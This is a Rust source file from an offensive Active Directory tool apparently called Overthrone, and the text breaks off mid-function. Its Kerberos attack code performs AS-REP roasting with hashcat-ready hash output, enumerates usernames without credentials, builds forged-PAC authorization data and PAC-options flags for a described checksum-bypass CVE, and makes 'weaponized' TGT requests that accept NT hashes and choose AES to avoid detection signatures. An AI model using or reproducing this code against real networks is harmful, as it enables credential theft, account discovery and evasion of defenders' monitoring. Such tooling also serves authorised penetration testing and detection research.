//! Kerberos protocol operations: AS-REQ, TGS-REQ, S4U2Self, S4U2Proxy.
//!
//! Uses `kerberos_asn1` (v0.2) for ASN.1 message construction
//! and `kerberos_crypto` (v0.3) for encryption/decryption.

use crate::error::{OverthroneError, Result};
use crate::proto::ntlm;
use chrono::Utc;
pub use kerberos_asn1::Checksum;
use kerberos_asn1::{
    ApReq, AsRep, AsReq, Asn1Object, Authenticator as KrbAuthenticator, EncAsRepPart,
    EncTgsRepPart, EncryptedData, KdcReqBody, KerbPaPacRequest, KerberosFlags, KerberosTime,
    KrbError, PaData, PaEncTsEnc, PaForUser, PaPacOptions, PrincipalName, TgsRep, TgsReq, Ticket,
};
use kerberos_crypto::new_kerberos_cipher;
use md5::Md5;
use std::net::SocketAddr;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
//  Constants
// ═══════════════════════════════════════════════════════════
pub const KDC_PORT: u16 = 88;

/// Normalize username by stripping @domain suffix if present.
/// This prevents double-domain bugs like "user@domain.com@DOMAIN.COM".
/// Also handles DOMAIN\user format.
pub fn normalize_username(username: &str) -> &str {
    // Handle down-level format: DOMAIN\user -> extract user
    if let Some((_, user)) = username.split_once('\\') {
        return user;
    }
    // Handle UPN format: user@domain -> extract user
    if let Some((before_at, _)) = username.split_once('@') {
        return before_at;
    }
    username
}

/// Normalize realm/domain to uppercase for Kerberos
pub fn normalize_realm(domain: &str) -> String {
    domain.to_uppercase()
}

// Encryption type IDs
pub const ETYPE_RC4_HMAC: i32 = 23;
pub const ETYPE_AES128_CTS: i32 = 17;
pub const ETYPE_AES256_CTS: i32 = 18;

// Principal name types
pub const NT_PRINCIPAL: i32 = 1;
pub const NT_SRV_INST: i32 = 2;

// PA-DATA types
pub const PA_ENC_TIMESTAMP: i32 = 2;
pub const PA_TGS_REQ: i32 = 1;
pub const PA_PAC_REQUEST: i32 = 128;
pub const PA_FOR_USER: i32 = 129;
pub const PA_PAC_OPTIONS: i32 = 167;
/// PA-FX-FAST (RFC 6806) — Kerberos armoring
pub const PA_FX_FAST: i32 = 136;
/// FX-FAST armored padata wrapper
pub const PA_FX_FAST_ARMORED: i32 = 137;
/// Armor key for TGT-based armoring in FAST
pub const KRB_ARMOR_TGT: i32 = 1;

// KDC option flag values (big-endian bit positions)
pub const KDC_OPT_FORWARDABLE: u32 = 0x40000000;
pub const KDC_OPT_RENEWABLE: u32 = 0x00800000;
pub const KDC_OPT_RENEWABLE_OK: u32 = 0x00000010;
pub const KDC_OPT_CANONICALIZE: u32 = 0x00010000;
pub const KDC_OPT_CNAME_IN_ADDL_TKT: u32 = 0x00004000;

// ═══════════════════════════════════════════════════════════
//  Public Types
// ═══════════════════════════════════════════════════════════

/// Supported Kerberos encryption types
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum EncType {
    /// `Rc4Hmac` variant
    Rc4Hmac,
    /// `Aes128CtsHmacSha1` variant
    Aes128CtsHmacSha1,
    /// `Aes256CtsHmacSha1` variant
    Aes256CtsHmacSha1,
}

impl EncType {
    pub fn to_etype_id(&self) -> i32 {
        match self {
            Self::Rc4Hmac => ETYPE_RC4_HMAC,
            Self::Aes128CtsHmacSha1 => ETYPE_AES128_CTS,
            Self::Aes256CtsHmacSha1 => ETYPE_AES256_CTS,
        }
    }
    /// Runs this module operation.
    pub fn from_etype_id(id: i32) -> Option<Self> {
        match id {
            ETYPE_RC4_HMAC => Some(Self::Rc4Hmac),
            ETYPE_AES128_CTS => Some(Self::Aes128CtsHmacSha1),
            ETYPE_AES256_CTS => Some(Self::Aes256CtsHmacSha1),
            _ => None,
        }
    }
}

/// Holds a Kerberos ticket + session key for reuse across requests
#[derive(Debug, Clone)]
pub struct TicketGrantingData {
    /// ticket field
    pub ticket: Ticket,
    /// Key data
    pub session_key: Vec<u8>,
    /// Classification for this object.
    pub session_key_etype: i32,
    /// client principal field
    pub client_principal: String,
    /// client realm field
    pub client_realm: String,
    /// end time field
    pub end_time: Option<KerberosTime>,
}

/// Crackable hash output (hashcat/john compatible)
#[derive(Debug, Clone, PartialEq)]
pub struct CrackableHash {
    /// Username for authentication
    pub username: String,
    /// Domain FQDN
    pub domain: String,
    /// Service Principal Name
    pub spn: Option<String>,
    /// Classification for this object.
    pub hash_type: HashType,
    /// Encryption type used (23=RC4, 17=AES128, 18=AES256)
    pub etype: i32,
    /// Hash value
    pub hash_string: String,
}
#[derive(Debug, Clone, PartialEq)]
pub enum HashType {
    /// `AsRepRoast` variant
    AsRepRoast,
    /// `Kerberoast` variant
    Kerberoast,
}

impl std::fmt::Display for CrackableHash {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.hash_string)
    }
}

// ═══════════════════════════════════════════════════════════
//  KDC TCP Transport
// ═══════════════════════════════════════════════════════════

/// Send a Kerberos message over TCP (4-byte BE length prefix + payload)
async fn kdc_send(stream: &mut TcpStream, data: &[u8]) -> Result<()> {
    let len_bytes = (data.len() as u32).to_be_bytes();
    stream.write_all(&len_bytes).await?;
    stream.write_all(data).await?;
    stream.flush().await?;
    Ok(())
}

/// Receive a Kerberos message over TCP
async fn kdc_recv(stream: &mut TcpStream) -> Result<Vec<u8>> {
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf).await?;
    let len = u32::from_be_bytes(len_buf) as usize;

    if len > 16 * 1024 * 1024 {
        return Err(OverthroneError::Kerberos(format!(
            "KDC response too large: {len} bytes"
        )));
    }

    let mut data = vec![0u8; len];
    stream.read_exact(&mut data).await?;
    Ok(data)
}

/// Connect to KDC, send request, receive response
async fn kdc_exchange(dc_ip: &str, request_bytes: &[u8]) -> Result<Vec<u8>> {
    let addr: SocketAddr = format!("{dc_ip}:{KDC_PORT}")
        .parse()
        .map_err(|e| OverthroneError::Kerberos(format!("Invalid KDC address: {e}")))?;

    let mut stream =
        tokio::time::timeout(std::time::Duration::from_secs(10), TcpStream::connect(addr))
            .await
            .map_err(|_| {
                OverthroneError::Kerberos(format!("KDC connection timed out after 10s: {addr}"))
            })?
            .map_err(|e| OverthroneError::Kerberos(format!("Cannot reach KDC at {addr}: {e}")))?;

    debug!("Connected to KDC at {addr}");
    kdc_send(&mut stream, request_bytes).await?;
    tokio::time::timeout(std::time::Duration::from_secs(15), kdc_recv(&mut stream))
        .await
        .map_err(|_| {
            OverthroneError::Kerberos(format!("KDC response timed out after 15s: {addr}"))
        })?
}

// ═══════════════════════════════════════════════════════════
//  Message Builders
// ═══════════════════════════════════════════════════════════

/// Build KDC-REQ-BODY for an AS-REQ
fn build_as_req_body(username: &str, realm: &str, etypes: &[i32]) -> KdcReqBody {
    let cname = PrincipalName {
        name_type: NT_PRINCIPAL,
        name_string: vec![username.to_string()],
    };

    let sname = PrincipalName {
        name_type: NT_SRV_INST,
        name_string: vec!["krbtgt".to_string(), realm.to_string()],
    };

    let now = Utc::now();
    let till = now + chrono::Duration::hours(10);

    KdcReqBody {
        kdc_options: kdc_flags(
            KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE | KDC_OPT_RENEWABLE_OK,
        ),
        cname: Some(cname),
        realm: realm.to_string(),
        sname: Some(sname),
        from: None,
        till: KerberosTime::from(till),
        rtime: Some(KerberosTime::from(till)),
        nonce: rand::random::<u32>(),
        etypes: etypes.to_vec(),
        addresses: None,
        enc_authorization_data: None,
        additional_tickets: None,
    }
}

/// Build KDC-REQ-BODY for a TGS-REQ
fn build_tgs_req_body(
    realm: &str,
    sname: PrincipalName,
    etypes: &[i32],
    flags: u32,
    additional_tickets: Option<Vec<Ticket>>,
    cname: Option<PrincipalName>,
) -> KdcReqBody {
    let now = Utc::now();
    let till = now + chrono::Duration::hours(10);

    KdcReqBody {
        kdc_options: kdc_flags(flags),
        cname,
        realm: realm.to_string(),
        sname: Some(sname),
        from: None,
        till: KerberosTime::from(till),
        rtime: None,
        nonce: rand::random::<u32>(),
        etypes: etypes.to_vec(),
        addresses: None,
        enc_authorization_data: None,
        additional_tickets,
    }
}

/// Helper: create KerberosFlags from a u32 bit field
fn kdc_flags(flags: u32) -> KerberosFlags {
    // KerberosFlags.flags is u32 in kerberos_asn1 v0.2
    KerberosFlags { flags }
}

/// Build PA-PAC-REQUEST padata
fn build_pa_pac_request(include_pac: bool) -> PaData {
    let pac_req = KerbPaPacRequest { include_pac };
    PaData {
        padata_type: PA_PAC_REQUEST,
        padata_value: pac_req.build(),
    }
}

/// Build PA-PAC-OPTIONS padata for checksum bypass exploitation.
///
/// CVE-2025-60704: When PA-PAC-OPTIONS is present with certain flag
/// combinations, the KDC may skip or reduce S4U2Self checksum validation.
///
/// The `pac_flags` parameter is a u32 bitmask of PA-PAC-OPTIONS flags.
/// Common flag values:
/// - `0x00000000`: No options (baseline)
/// - `0x80000000`: Resource-based constrained delegation flag
/// - `0x40000000`: Claims flag
/// - `0xC0000000`: Both flags (maximum bypass)
pub fn build_pa_pac_options(pac_flags: u32) -> PaData {
    let options = PaPacOptions {
        kerberos_flags: KerberosFlags::from(pac_flags),
    };
    PaData {
        padata_type: PA_PAC_OPTIONS,
        padata_value: options.build(),
    }
}

/// Build a raw S4U2Self checksum (without HMAC) for the null-checksum technique.
/// Same input data format as `build_s4u2self_checksum` but returns raw bytes
/// instead of a `Checksum` struct.
pub fn build_s4u2self_checksum_raw(username: &str, realm: &str) -> Vec<u8> {
    let mut data: Vec<u8> = Vec::new();
    data.extend_from_slice(&(NT_PRINCIPAL as u32).to_le_bytes());
    data.extend_from_slice(username.as_bytes());
    data.extend_from_slice(realm.as_bytes());
    data.extend_from_slice(b"Kerberos");
    data
}

/// Build encrypted timestamp for pre-authentication
fn build_pa_enc_timestamp(key: &[u8], etype: i32) -> Result<PaData> {
    let now = Utc::now();
    let timestamp = PaEncTsEnc {
        patimestamp: KerberosTime::from(now),
        pausec: Some(now.timestamp_subsec_micros() as i32),
    };

    let cipher = new_kerberos_cipher(etype)
        .map_err(|e| OverthroneError::Kerberos(format!("Unsupported etype {etype}: {e}")))?;

    // kerberos_crypto v0.3: encrypt() returns Vec<u8> directly (infallible)
    let encrypted = cipher.encrypt(key, 1, &timestamp.build());

    let enc_data = EncryptedData {
        etype,
        kvno: None,
        cipher: encrypted,
    };

    Ok(PaData {
        padata_type: PA_ENC_TIMESTAMP,
        padata_value: enc_data.build(),
    })
}

/// Build Authenticator encrypted with session key for AP-REQ
pub fn build_encrypted_authenticator(
    realm: &str,
    cname: &str,
    session_key: &[u8],
    etype: i32,
) -> Result<EncryptedData> {
    let now = Utc::now();

    let authenticator = KrbAuthenticator {
        authenticator_vno: 5,
        crealm: realm.to_string(),
        cname: PrincipalName {
            name_type: NT_PRINCIPAL,
            name_string: vec![cname.to_string()],
        },
        cksum: None,
        cusec: now.timestamp_subsec_micros() as i32,
        ctime: KerberosTime::from(now),
        subkey: None,
        seq_number: Some(rand::random::<u32>()),
        authorization_data: None,
    };

    let cipher = new_kerberos_cipher(etype)
        .map_err(|e| OverthroneError::Kerberos(format!("Cipher error: {e}")))?;

    // kerberos_crypto v0.3: encrypt() returns Vec<u8> directly (infallible)
    let encrypted = cipher.encrypt(session_key, 7, &authenticator.build());

    Ok(EncryptedData {
        etype,
        kvno: None,
        cipher: encrypted,
    })
}

/// Build AP-REQ wrapping a ticket + encrypted authenticator
pub fn build_ap_req(ticket: &Ticket, encrypted_auth: EncryptedData) -> ApReq {
    ApReq {
        pvno: 5,
        msg_type: 14,
        ap_options: KerberosFlags::default(),
        ticket: ticket.clone(),
        authenticator: encrypted_auth,
    }
}

/// Build raw DER-encoded authorization-data containing a forged PAC.
///
/// Structure:
///   SEQUENCE {
///     AuthorizationDataEntry {
///       [0] INTEGER 1        (AD-IF-RELEVANT)
///       [1] OCTET STRING {
///         SEQUENCE {
///           [0] INTEGER 128   (AD-WIN2K-PAC)
///           [1] OCTET STRING  (pac_bytes)
///         }
///       }
///     }
///   }
pub fn build_pac_authdata_raw(pac_bytes: &[u8]) -> Vec<u8> {
    let ad_type_pac = asn1_context_tag(0, &asn1_integer(128));
    let ad_data_pac = asn1_context_tag(1, &asn1_octet_string(pac_bytes));
    let inner_pac_entry = asn1_sequence_raw(&[&ad_type_pac, &ad_data_pac]);

    let ad_type_if_relevant = asn1_context_tag(0, &asn1_integer(1));
    let ad_data_wrapper = asn1_context_tag(1, &asn1_octet_string(&inner_pac_entry));
    let authdata_entry = asn1_sequence_raw(&[&ad_type_if_relevant, &ad_data_wrapper]);

    asn1_sequence(&[&authdata_entry])
}

/// Build an encrypted authenticator that includes authorization-data.
///
/// Builds the authenticator manually using raw ASN.1 helpers (like
/// `build_encrypted_authenticator` but with authorization-data), then
/// encrypts with key_usage=7.
pub fn build_encrypted_authenticator_with_authdata(
    realm: &str,
    cname: &str,
    session_key: &[u8],
    etype: i32,
    auth_data_raw: &[u8],
) -> Result<EncryptedData> {
    let now = Utc::now();

    let tag0 = asn1_context_tag(0, &asn1_integer(NT_PRINCIPAL as i64));
    let tag1 = asn1_context_tag(1, &asn1_sequence_of_general_strings(&[cname]));
    let cname_seq = asn1_sequence_raw(&[&tag0, &tag1]);

    let ctag0 = asn1_context_tag(0, &asn1_integer(5));
    let ctag1 = asn1_context_tag(1, &asn1_general_string(realm));
    let ctag2 = asn1_context_tag(2, &cname_seq);
    let ctag4 = asn1_context_tag(4, &asn1_integer(now.timestamp_subsec_micros() as i64));
    let ctag5 = asn1_context_tag(5, &asn1_generalized_time(&format_kerberos_time(&now)));
    let ctag7 = asn1_context_tag(7, &asn1_integer(rand::random::<u32>() as i64));
    let ctag10 = asn1_context_tag(10, auth_data_raw);
    let authenticator_raw =
        asn1_sequence_raw(&[&ctag0, &ctag1, &ctag2, &ctag4, &ctag5, &ctag7, &ctag10]);

    let cipher = new_kerberos_cipher(etype)
        .map_err(|e| OverthroneError::Kerberos(format!("Cipher error: {e}")))?;

    let encrypted = cipher.encrypt(session_key, 7, &authenticator_raw);

    Ok(EncryptedData {
        etype,
        kvno: None,
        cipher: encrypted,
    })
}

/// Build a serialized AP-REQ from raw ticket bytes + session key.
/// This is the entry point for SMB2 Kerberos SPNEGO authentication.
pub fn build_ap_req_bytes(
    ticket_data: &[u8],
    session_key: &[u8],
    etype: i32,
    realm: &str,
    cname: &str,
) -> Result<Vec<u8>> {
    let (_, ticket) = Ticket::parse(ticket_data)
        .map_err(|e| OverthroneError::Kerberos(format!("Failed to parse ticket: {e}")))?;
    let encrypted_auth = build_encrypted_authenticator(realm, cname, session_key, etype)?;
    let ap_req = build_ap_req(&ticket, encrypted_auth);
    Ok(ap_req.build())
}

fn hashcat_checksum_len(etype: i32) -> usize {
    if etype == ETYPE_RC4_HMAC { 16 } else { 12 }
}

fn format_asrep_hash_string(etype: i32, username: &str, realm: &str, cipher: &[u8]) -> String {
    let (checksum, edata2) =
        cipher.split_at(std::cmp::min(hashcat_checksum_len(etype), cipher.len()));
    format!(
        "$krb5asrep${}${}@{}:{}${}",
        etype,
        username,
        realm,
        hex::encode(checksum),
        hex::encode(edata2),
    )
}

fn format_tgs_hash_string(
    etype: i32,
    username: &str,
    realm: &str,
    target_spn: &str,
    cipher: &[u8],
) -> String {
    let (checksum, edata2) =
        cipher.split_at(std::cmp::min(hashcat_checksum_len(etype), cipher.len()));
    format!(
        "$krb5tgs${}$*{}${}${}*${}${}",
        etype,
        username,
        realm,
        target_spn,
        hex::encode(checksum),
        hex::encode(edata2),
    )
}

/// Try to parse a KDC response as KRB-ERROR and return a meaningful error
fn parse_krb_error(data: &[u8]) -> OverthroneError {
    match KrbError::parse(data) {
        Ok((_, krb_err)) => {
            let code = krb_err.error_code;
            let base_msg = format!("KRB_ERROR {code}: {}", krb_error_to_string(code));

            // For WRONG_REALM, extract realm hints from the KRB-ERROR response
            if code == 68 {
                // KDC_ERR_WRONG_REALM — the KDC often includes the correct realm
                let suggested_realm =
                    krb_err.crealm.as_ref().map(|r| r.to_string()).or_else(|| {
                        // Fall back to the service realm from the error
                        let r = krb_err.realm.to_string();
                        if !r.is_empty() { Some(r) } else { None }
                    });

                return if let Some(ref realm) = suggested_realm {
                    OverthroneError::Kerberos(format!(
                        "{base_msg}. Did you mean '{realm}'? Try: --domain {realm}\n\
                         Hint: verify realm with: nslookup -type=SRV _ldap._tcp.dc._msdcs.{realm}",
                        realm = realm
                    ))
                } else {
                    OverthroneError::Kerberos(format!(
                        "{base_msg}. The specified realm/domain is incorrect.\n\
                         Hint: verify realm with: nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>"
                    ))
                };
            }

            OverthroneError::Kerberos(base_msg)
        }
        Err(_) => OverthroneError::Kerberos("Failed to parse KDC response".to_string()),
    }
}

/// Extract the suggested realm from a KDC_ERR_WRONG_REALM (code 68) response.
/// Returns `None` if the error is not code 68 or no realm can be extracted.
fn extract_wrong_realm(data: &[u8]) -> Option<String> {
    let (_, krb_err) = KrbError::parse(data).ok()?;
    if krb_err.error_code != 68 {
        return None;
    }
    krb_err.crealm.as_ref().map(|r| r.to_string()).or_else(|| {
        let r = krb_err.realm.to_string();
        if !r.is_empty() { Some(r) } else { None }
    })
}

/// Resolve a KDC IP for the given realm via DNS SRV lookup.
async fn resolve_realm_kdc(realm: &str) -> Result<String> {
    let query = format!("{}.{}", super::dns::SRV_KERBEROS, realm);
    let resolver = super::dns::DnsResolver::system()?;
    let records = resolver.lookup_srv(&query).await?;
    records
        .first()
        .and_then(|r| r.ips.first().cloned())
        .ok_or_else(|| {
            OverthroneError::Kerberos(format!("No KDC found via DNS SRV for realm '{realm}'"))
        })
}

// ═══════════════════════════════════════════════════════════
//  AS-REP Roasting (no pre-auth required)
// ═══════════════════════════════════════════════════════════

/// Perform AS-REP Roasting against a user with DONT_REQ_PREAUTH.
/// Returns a hashcat-mode-18200 compatible hash string.
pub async fn asrep_roast(dc_ip: &str, domain: &str, username: &str) -> Result<CrackableHash> {
    asrep_roast_with_etypes(
        dc_ip,
        domain,
        username,
        &[ETYPE_RC4_HMAC, ETYPE_AES256_CTS, ETYPE_AES128_CTS],
    )
    .await
}

/// AS-REP roast with configurable etypes (use multiple to get AES256/128 hashes).
/// Cross-forest scenarios should include the account's salt for AES derivation.
pub async fn asrep_roast_with_etypes(
    dc_ip: &str,
    domain: &str,
    username: &str,
    etypes: &[i32],
) -> Result<CrackableHash> {
    let realm = normalize_realm(domain);
    let clean_username = normalize_username(username);
    info!("AS-REP Roasting: {clean_username}@{realm} via {dc_ip} (etypes: {etypes:?})");

    // AS-REQ WITHOUT pre-auth — request multiple etypes to capture AES hashes
    let req_body = build_as_req_body(clean_username, &realm, etypes);

    let as_req = AsReq {
        pvno: 5,
        msg_type: 10,
        padata: Some(vec![build_pa_pac_request(true)]),
        req_body,
    };

    let response_bytes = kdc_exchange(dc_ip, &as_req.build()).await?;

    match AsRep::parse(&response_bytes) {
        Ok((_, as_rep)) => {
            let enc_part = &as_rep.enc_part;
            let cipher = &enc_part.cipher;

            let hash_string =
                format_asrep_hash_string(enc_part.etype, clean_username, &realm, cipher);

            info!(
                "AS-REP hash obtained for {clean_username} (etype: {})",
                enc_part.etype
            );
            Ok(CrackableHash {
                username: clean_username.to_string(),
                domain: domain.to_string(),
                spn: None,
                hash_type: HashType::AsRepRoast,
                etype: enc_part.etype,
                hash_string,
            })
        }
        Err(_) => Err(parse_krb_error(&response_bytes)),
    }
}

// ═══════════════════════════════════════════════════════════
//  Kerberos Username Enumeration (Zero-Knowledge)
// ═══════════════════════════════════════════════════════════

/// Result of a single username enumeration probe
#[derive(Debug, Clone, PartialEq)]
pub enum UserEnumStatus {
    /// User exists and requires pre-authentication (KDC_ERR_PREAUTH_REQUIRED)
    Valid,
    /// User exists and does NOT require pre-auth — AS-REP hash captured
    ValidNoPreauth(CrackableHash),
    /// User exists but account is disabled/revoked (KDC_ERR_CLIENT_REVOKED)
    Disabled,
    /// User does not exist (KDC_ERR_C_PRINCIPAL_UNKNOWN)
    NotFound,
    /// KDC returned an unexpected error
    Error(String),
}

/// Probe whether a username exists via Kerberos AS-REQ (no credentials needed).
/// Sends an AS-REQ without PA-ENC-TIMESTAMP. The KDC error code reveals:
/// - `KDC_ERR_C_PRINCIPAL_UNKNOWN` (6)  → user does NOT exist
/// - `KDC_ERR_PREAUTH_REQUIRED` (25)    → user EXISTS (needs pre-auth)
/// - `KDC_ERR_CLIENT_REVOKED` (18)      → user EXISTS but disabled
/// - Full AS-REP response               → user EXISTS + no pre-auth (hash captured)
pub async fn user_enum_single(dc_ip: &str, domain: &str, username: &str) -> UserEnumStatus {
    let realm = normalize_realm(domain);
    let clean_username = normalize_username(username);

    let req_body = build_as_req_body(clean_username, &realm, &[ETYPE_RC4_HMAC]);
    let as_req = AsReq {
        pvno: 5,
        msg_type: 10,
        padata: Some(vec![build_pa_pac_request(true)]),
        req_body,
    };

    let response_bytes = match kdc_exchange(dc_ip, &as_req.build()).await {
        Ok(bytes) => bytes,
        Err(e) => return UserEnumStatus::Error(e.to_string()),
    };

    // If we get a valid AS-REP, the user exists AND has no pre-auth — jackpot
    if let Ok((_, as_rep)) = AsRep::parse(&response_bytes) {
        let enc_part = &as_rep.enc_part;
        let cipher_data = &enc_part.cipher;
        let hash_string =
            format_asrep_hash_string(enc_part.etype, clean_username, &realm, cipher_data);
        return UserEnumStatus::ValidNoPreauth(CrackableHash {
            username: clean_username.to_string(),
            domain: domain.to_string(),
            spn: None,
            hash_type: HashType::AsRepRoast,
            etype: enc_part.etype,
            hash_string,
        });
    }

    // Parse KRB-ERROR to determine user existence
    match KrbError::parse(&response_bytes) {
        Ok((_, krb_err)) => match krb_err.error_code {
            6 => UserEnumStatus::NotFound,  // KDC_ERR_C_PRINCIPAL_UNKNOWN
            25 => UserEnumStatus::Valid,    // KDC_ERR_PREAUTH_REQUIRED
            18 => UserEnumStatus::Disabled, // KDC_ERR_CLIENT_REVOKED
            24 => UserEnumStatus::Valid,    // KDC_ERR_PREAUTH_FAILED (user exists)
            code => {
                UserEnumStatus::Error(format!("KRB_ERROR {code}: {}", krb_error_to_string(code)))
            }
        },
        Err(_) => UserEnumStatus::Error("Failed to parse KDC response".to_string()),
    }
}

// ═══════════════════════════════════════════════════════════
//  TGT Request (with pre-authentication)
// ═══════════════════════════════════════════════════════════

/// Request a TGT via AS-REQ with PA-ENC-TIMESTAMP pre-auth.
/// `secret` is either a password or NT hash (set `use_hash=true`).
/// If the KDC returns KDC_ERR_WRONG_REALM (code 68), the function
/// automatically follows the referral by resolving the suggested realm's
/// KDC via DNS SRV and retrying (max 2 hops).
pub async fn request_tgt(
    dc_ip: &str,
    domain: &str,
    username: &str,
    secret: &str,
    use_hash: bool,
) -> Result<TicketGrantingData> {
    let realm = normalize_realm(domain);
    let clean_username = normalize_username(username);
    info!("Requesting TGT for {clean_username}@{realm}");

    let (key, etype) = if use_hash {
        (ntlm::parse_ntlm_hash(secret)?, ETYPE_RC4_HMAC)
    } else {
        (ntlm::nt_hash(secret), ETYPE_RC4_HMAC)
    };

    let mut current_dc = dc_ip.to_string();
    let mut current_realm = realm.clone();

    for hop in 0..=2 {
        let pa_timestamp = build_pa_enc_timestamp(&key, etype)?;
        let pa_pac = build_pa_pac_request(true);
        let req_body = build_as_req_body(clean_username, &current_realm, &[etype]);

        let as_req = AsReq {
            pvno: 5,
            msg_type: 10,
            padata: Some(vec![pa_timestamp, pa_pac]),
            req_body,
        };

        let response_bytes = kdc_exchange(&current_dc, &as_req.build()).await?;

        match AsRep::parse(&response_bytes) {
            Ok((_, as_rep)) => {
                // Decrypt enc-part to extract session key
                let cipher = new_kerberos_cipher(etype)
                    .map_err(|e| OverthroneError::Kerberos(format!("Cipher init: {e}")))?;

                let decrypted = cipher
                    .decrypt(&key, 3, &as_rep.enc_part.cipher)
                    .map_err(|e| {
                        OverthroneError::Kerberos(format!("AS-REP decrypt failed: {e}"))
                    })?;

                let (_, enc_part) = EncAsRepPart::parse(&decrypted)
                    .map_err(|e| OverthroneError::Kerberos(format!("Parse EncAsRepPart: {e}")))?;

                info!(
                    "TGT obtained for {username}@{current_realm} (etype: {})",
                    enc_part.key.keytype
                );

                return Ok(TicketGrantingData {
                    ticket: as_rep.ticket,
                    session_key: enc_part.key.keyvalue.clone(),
                    session_key_etype: enc_part.key.keytype,
                    client_principal: clean_username.to_string(),
                    client_realm: current_realm,
                    end_time: Some(enc_part.endtime),
                });
            }
            Err(_) => {
                // Check if this is a WRONG_REALM referral
                if let Some(suggested) = extract_wrong_realm(&response_bytes) {
                    if hop >= 2 {
                        return Err(OverthroneError::Kerberos(format!(
                            "KDC_ERR_WRONG_REALM: exceeded max referral hops (referred to '{suggested}')"
                        )));
                    }
                    info!("KDC referred us to realm '{suggested}' (hop {hop})");

                    // Resolve the new realm's KDC via DNS SRV
                    match resolve_realm_kdc(&suggested).await {
                        Ok(new_dc) => {
                            current_dc = new_dc;
                            current_realm = suggested;
                            continue;
                        }
                        Err(e) => {
                            return Err(OverthroneError::Kerberos(format!(
                                "KDC_ERR_WRONG_REALM: referred to '{suggested}' but DNS SRV resolution failed: {e}"
                            )));
                        }
                    }
                }
                // Not a WRONG_REALM — return the original error
                return Err(parse_krb_error(&response_bytes));
            }
        }
    }

    Err(OverthroneError::Kerberos(
        "request_tgt: referral loop exhausted".to_string(),
    ))
}

/// Options for OPSEC-compliant TGT requests.
#[derive(Debug, Clone, Default)]
pub struct RequestTgtOptions {
    /// Use AES256 (etype 18) instead of RC4 (etype 23).
    /// Avoids MDI signatures from RC4 ticket requests.
    pub aes_only: bool,
    /// Enable FAST armoring (RFC 6806) for the TGT request.
    /// Required for WS2025 domains with FAST enforcement.
    pub use_fast_armor: bool,
    /// TGT to use as armor ticket (required if `use_fast_armor` is true).
    pub armor_tgt: Option<TicketGrantingData>,
}

/// Request a TGT with OPSEC options (AES-only mode).
///
/// This is the weaponized version of `request_tgt` that defaults to
/// AES256 (etype 18) to avoid MDI signatures from RC4 ticket requests.
///
/// When `aes_only` is true:
/// - Requests etype 18 as the preferred encryption type
/// - Falls back to etype 17 (AES128) then 23 (RC4) if AES256 is unsupported
/// - Uses the password → AES key derivation instead of NT hash → RC4
///
/// When `aes_only` is false, behaves identically to `request_tgt`.
pub async fn request_tgt_opsec(
    dc_ip: &str,
    domain: &str,
    username: &str,
    secret: &str,
    use_hash: bool,
    options: &RequestTgtOptions,
) -> Result<TicketGrantingData> {
    let realm = normalize_realm(domain);
    let clean_username = normalize_username(username);

    if options.use_fast_armor {
        warn!(
            "FAST armoring for AS-REQ requires anonymous PKINIT (not implemented). Use request_service_ticket_fast() for TGS-REQ FAST armoring."
        );
    }

    let supported_etypes: &[i32] = if options.aes_only {
        &[ETYPE_AES256_CTS, ETYPE_AES128_CTS, ETYPE_RC4_HMAC]
    } else {
        &[ETYPE_RC4_HMAC, ETYPE_AES256_CTS, ETYPE_AES128_CTS]
    };

    info!(
        "Requesting TGT for {clean_username}@{realm} (etypes={:?})",
        supported_etypes
    );

    // For AES-only: derive AES key from password instead of NT hash
    // For RC4 fallback: use NT hash as before
    let (key, primary_etype) = if use_hash {
        (ntlm::parse_ntlm_hash(secret)?, ETYPE_RC4_HMAC)
    } else if options.aes_only {
        let salt = format!("{}{}", realm.to_uppercase(), clean_username);
        let aes_key = crate::crypto::derive_key_aes256(secret, &salt);
        (aes_key.to_vec(), ETYPE_AES256_CTS)
    } else {
        (ntlm::nt_hash(secret), ETYPE_RC4_HMAC)
    };

    let mut current_dc = dc_ip.to_string();
    let mut current_realm = realm.clone();

    for hop in 0..=2 {
        let pa_timestamp = build_pa_enc_timestamp(&key, primary_etype)?;
        let pa_pac = build_pa_pac_request(true);
        let req_body = build_as_req_body(clean_username, &current_realm, supported_etypes);

        let as_req = AsReq {
            pvno: 5,
            msg_type: 10,
            padata: Some(vec![pa_timestamp, pa_pac]),
            req_body,
        };

        let response_bytes = kdc_exchange(&current_dc, &as_req.build()).await?;

        // Try decrypting with the primary key first, then fallback etypes
        let decryption_etypes: &[i32] = if options.aes_only {
            &[ETYPE_AES256_CTS, ETYPE_AES128_CTS, ETYPE_RC4_HMAC]
        } else {
            &[ETYPE_RC4_HMAC, ETYPE_AES256_CTS, ETYPE_AES128_CTS]
        };

        match AsRep::parse(&response_bytes) {
            Ok((_, as_rep)) => {
                let mut decrypted: Option<Vec<u8>> = None;

                for &try_etype in decryption_etypes {
                    let try_key = if try_etype == ETYPE_RC4_HMAC {
                        ntlm::nt_hash(secret)
                    } else if try_etype == ETYPE_AES256_CTS {
                        let salt = format!("{}{}", realm.to_uppercase(), clean_username);
                        crate::crypto::derive_key_aes256(secret, &salt).to_vec()
                    } else if try_etype == ETYPE_AES128_CTS {
                        let salt = format!("{}{}", realm.to_uppercase(), clean_username);
                        crate::crypto::derive_key_aes128(secret, &salt).to_vec()
                    } else {
                        continue;
                    };

                    match new_kerberos_cipher(try_etype) {
                        Ok(cipher) => match cipher.decrypt(&try_key, 3, &as_rep.enc_part.cipher) {
                            Ok(d) => {
                                decrypted = Some(d);
                                break;
                            }
                            Err(_) => continue,
                        },
                        Err(_) => continue,
                    }
                }

                let decrypted = decrypted.ok_or_else(|| {
                    OverthroneError::Kerberos(
                        "AS-REP decrypt failed with all supported etypes".into(),
                    )
                })?;

                let (_, enc_part) = EncAsRepPart::parse(&decrypted)
                    .map_err(|e| OverthroneError::Kerberos(format!("Parse EncAsRepPart: {e}")))?;

                info!(
                    "TGT obtained for {username}@{current_realm} (response etype: {})",
                    enc_part.key.keytype
                );

                return Ok(TicketGrantingData {
                    ticket: as_rep.ticket,
                    session_key: enc_part.key.keyvalue.clone(),
                    session_key_etype: enc_part.key.keytype,
